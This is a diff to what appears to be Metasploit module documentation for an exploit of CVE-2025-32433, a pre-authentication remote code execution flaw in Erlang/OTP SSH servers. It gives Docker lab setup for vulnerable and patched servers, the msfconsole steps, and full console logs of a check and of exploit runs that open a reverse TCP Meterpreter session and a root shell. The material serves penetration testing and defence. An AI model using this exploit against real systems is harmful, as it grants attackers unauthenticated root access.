@@ -9,8 +9,6 @@ By exploiting a flaw in SSH protocol message handling, a malicious actor could g
 to affected systems and execute arbitrary commands without valid credentials. This issue is patched in
 versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20.
 
-A temporary workaround involves disabling the SSH server or to prevent access via firewall rules.
-
 ### Introduction
 
 This module exploits CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH servers
@@ -22,6 +20,8 @@ function without requiring authentication.
 
 ## Testing
 
+### Vulnerable application
+
 Execute the following commands:
 
 ```bash
@@ -31,12 +31,23 @@ docker build -t cve-ssh:latest .
 docker run -d -p 2222:2222 cve-ssh:latest
 ```
 
+### Patched application
+
+Execute the following commands:
+
+```bash
+git clone https://github.com/exa-offsec/ssh_erlangotp_rce
+cd ssh_erlangotp_rce/patched
+docker build -t patched-ssh:latest .
+docker run -d -p 2223:2223 patched-ssh:latest
+```
+
 ## Verification Steps
 
 1. Start msfconsole
 2. Do: `use exploit/linux/ssh/ssh_erlangotp_rce`
 3. Do: `set RHOSTS [IP]`
-5. Do: `run`
+4. Do: `run`
 
 ## Scenarios
 
@@ -84,18 +95,34 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 
+msf6 exploit(linux/ssh/ssh_erlangotp_rce) > check
+[*] 192.168.1.16:2222 - Using auxiliary/scanner/ssh/ssh_erlangotp as check
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - The target is vulnerable to CVE-2025-32433.
+[*] 192.168.1.16:2222      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.16:2222 - The target is vulnerable.
+
 msf6 exploit(linux/ssh/ssh_erlangotp_rce) > run
 [*] Started reverse TCP handler on 192.168.1.16:4444 
-[*] Starting exploit for CVE-2025-32433
-[*] Connecting to SSH server...
-[*] Sending SSH banner...
-[+] Received banner: SSH-2.0-Erlang/5.1.4.7
-[*] Sending SSH_MSG_KEXINIT...
-[*] Sending SSH_MSG_CHANNEL_OPEN...
-[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
-[+] Payload sent successfully
+[*] 192.168.1.16:2222 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.1.16:2222 - Using auxiliary/scanner/ssh/ssh_erlangotp as check
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - The target is vulnerable to CVE-2025-32433.
+[*] 192.168.1.16:2222      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.16:2222 - The target is vulnerable.
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Starting exploit for CVE-2025-32433
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH banner...
+[+] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Received banner: SSH-2.0-Erlang/5.1.4.7
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Payload sent successfully
 [*] Sending stage (3045380 bytes) to 172.17.0.2
-[*] Meterpreter session 6 opened (192.168.1.16:4444 -> 172.17.0.2:41536) at 2025-04-18 23:38:52 +0400
+[*] Meterpreter session 1 opened (192.168.1.16:4444 -> 172.17.0.2:42718) at 2025-04-20 17:31:35 +0400
 
 meterpreter > 
 ```
@@ -130,17 +157,33 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 
+msf6 exploit(linux/ssh/ssh_erlangotp_rce) > check
+[*] 192.168.1.16:2222 - Using auxiliary/scanner/ssh/ssh_erlangotp as check
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - The target is vulnerable to CVE-2025-32433.
+[*] 192.168.1.16:2222      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.16:2222 - The target is vulnerable.
+
 msf6 exploit(linux/ssh/ssh_erlangotp_rce) > run
 [*] Started reverse TCP handler on 192.168.1.16:4444 
-[*] Starting exploit for CVE-2025-32433
-[*] Connecting to SSH server...
-[*] Sending SSH banner...
-[+] Received banner: SSH-2.0-Erlang/5.1.4.7
-[*] Sending SSH_MSG_KEXINIT...
-[*] Sending SSH_MSG_CHANNEL_OPEN...
-[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
-[+] Payload sent successfully
-[*] Command shell session 7 opened (192.168.1.16:4444 -> 172.17.0.2:50092) at 2025-04-18 23:53:55 +0400
+[*] 192.168.1.16:2222 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.1.16:2222 - Using auxiliary/scanner/ssh/ssh_erlangotp as check
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.1.16:2222      - ssh://192.168.1.16:2222 - The target is vulnerable to CVE-2025-32433.
+[*] 192.168.1.16:2222      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.16:2222 - The target is vulnerable.
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Starting exploit for CVE-2025-32433
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH banner...
+[+] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Received banner: SSH-2.0-Erlang/5.1.4.7
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.1.16:2222 - ssh://192.168.1.16:2222 - Payload sent successfully
+[*] Command shell session 3 opened (192.168.1.16:4444 -> 172.17.0.2:45134) at 2025-04-20 17:33:33 +0400
 
 whoami
 root
